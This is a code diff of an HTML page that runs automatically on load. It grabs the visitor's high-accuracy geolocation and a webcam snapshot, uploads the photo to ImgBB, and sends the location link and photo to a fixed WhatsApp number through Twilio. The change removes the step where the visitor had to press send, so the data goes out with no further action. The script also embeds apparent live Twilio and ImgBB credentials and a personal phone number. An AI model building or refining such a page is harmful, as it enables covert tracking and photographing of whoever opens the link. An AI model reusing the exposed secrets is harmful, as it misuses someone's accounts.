@@ -3,96 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Location & Auto Photo to WhatsApp</title>
+    <title>Live Location & Photo to WhatsApp</title>
 </head>
 <body>
-    <h1>Sending Live Location & Photo to WhatsApp...</h1>
-    <p id="status">Initializing...</p>
-    <canvas id="canvas" style="display: none;"></canvas>
+    <h2>Auto Sending Photo & Location to WhatsApp...</h2>
+    <p id="status">Getting location...</p>
 
     <script>
-        const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";  // Replace with your ImgBB API key
-        const WHATSAPP_NUMBER = "94713424265";  // Replace with recipient's WhatsApp number
+        // API Keys & Configurations
+        const TWILIO_SID = "AC159bc3453fcb4a949b69114a34d0ba26";  // Twilio Account SID
+        const TWILIO_AUTH = "de80a844038a0abdea17be298ccef25e";  // Twilio Auth Token
+        const TWILIO_NUMBER = "whatsapp:+18147884932";  // Twilio Sandbox Number
+        const USER_WHATSAPP = "whatsapp:+94713424265";  // Your WhatsApp Number
+        const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";  // ImgBB API Key
 
-        let locationLink = "";  
-
-        // 📌 Function to send message to WhatsApp
-        function sendToWhatsApp(photoLink) {
-            const message = `📍 Location: ${locationLink}\n📷 Photo: ${photoLink}`;
-            const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
-            window.location.href = whatsappUrl; 
-        }
-
-        // 📌 Function to get live location
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        locationLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                        document.getElementById("status").innerText = "Location found! Taking photo...";
-                        capturePhoto();
-                    },
-                    (error) => {
-                        document.getElementById("status").innerText = "Error getting location: " + error.message;
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
-            } else {
-                document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
-            }
-        }
-
-        // 📌 Function to capture photo
-        async function capturePhoto() {
+        // Upload Image to ImgBB
+        async function uploadToImgBB(imageData) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.play();
+                const formData = new FormData();
+                formData.append("image", imageData.split(",")[1]);
 
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        const canvas = document.getElementById("canvas");
-                        const ctx = canvas.getContext("2d");
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        stream.getTracks().forEach(track => track.stop()); // Stop the camera
-                        canvas.toBlob(uploadToImgBB, "image/png");
-                    }, 1000);
-                };
+                const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+                    method: "POST",
+                    body: formData
+                });
+
+                const data = await response.json();
+                if (data.success) {
+                    return data.data.url;  // Return image URL
+                } else {
+                    throw new Error("ImgBB upload failed!");
+                }
             } catch (error) {
-                document.getElementById("status").innerText = "Error accessing camera: " + error.message;
+                console.error("ImgBB Error:", error);
+                return null;
             }
         }
 
-        // 📌 Function to upload photo to ImgBB
-        function uploadToImgBB(blob) {
-            const formData = new FormData();
-            formData.append("image", blob);
-            formData.append("key", IMGBB_API_KEY);
+        // Send Photo & Location to WhatsApp via Twilio
+        async function sendToWhatsApp(photoUrl, latitude, longitude) {
+            try {
+                const message = `📍 My Location: https://www.google.com/maps?q=${latitude},${longitude}\n🖼️ Photo: ${photoUrl}`;
+                const url = `https://api.twilio.com/2010-04-01/Accounts/${TWILIO_SID}/Messages.json`;
 
-            fetch("https://api.imgbb.com/1/upload", {
-                method: "POST",
-                body: formData,
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    sendToWhatsApp(data.data.url);
-                } else {
-                    document.getElementById("status").innerText = "ImgBB upload error: " + data.error.message;
-                }
-            })
-            .catch(error => {
-                document.getElementById("status").innerText = "Error uploading photo: " + error.message;
-            });
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Authorization": "Basic " + btoa(TWILIO_SID + ":" + TWILIO_AUTH),
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    body: new URLSearchParams({
+                        From: TWILIO_NUMBER,
+                        To: USER_WHATSAPP,
+                        Body: message
+                    })
+                });
+
+                const result = await response.json();
+                console.log("Sent to WhatsApp:", result);
+                document.getElementById("status").innerText = "Sent successfully!";
+            } catch (error) {
+                console.error("Twilio Error:", error);
+                document.getElementById("status").innerText = "Failed to send.";
+            }
         }
 
-        // 📌 Start tracking location on page load
-        window.onload = getLocation;
+        // Capture Photo & Get Location
+        async function captureAndSend() {
+            try {
+                // Start getting location and capturing the photo in parallel
+                const [position, photo] = await Promise.all([
+                    new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, maximumAge: 0 });
+                    }),
+                    capturePhoto()
+                ]);
+
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+
+                document.getElementById("status").innerText = "Uploading photo...";
+
+                // Upload Photo to ImgBB and Send to WhatsApp
+                const photoUrl = await uploadToImgBB(photo);
+                if (photoUrl) {
+                    document.getElementById("status").innerText = "Sending to WhatsApp...";
+                    sendToWhatsApp(photoUrl, lat, lng);
+                } else {
+                    document.getElementById("status").innerText = "Image upload failed.";
+                }
+
+            } catch (error) {
+                document.getElementById("status").innerText = "Error: " + error.message;
+            }
+        }
+
+        // Capture a Photo with reduced resolution for speed
+        async function capturePhoto() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }); // Reduced resolution
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement("canvas");
+            canvas.width = 640;  // Reduced resolution width
+            canvas.height = 480; // Reduced resolution height
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(track => track.stop());
+
+            return canvas.toDataURL("image/png");
+        }
+
+        // Auto-run on page load
+        window.onload = captureAndSend;
     </script>
 </body>
 </html>
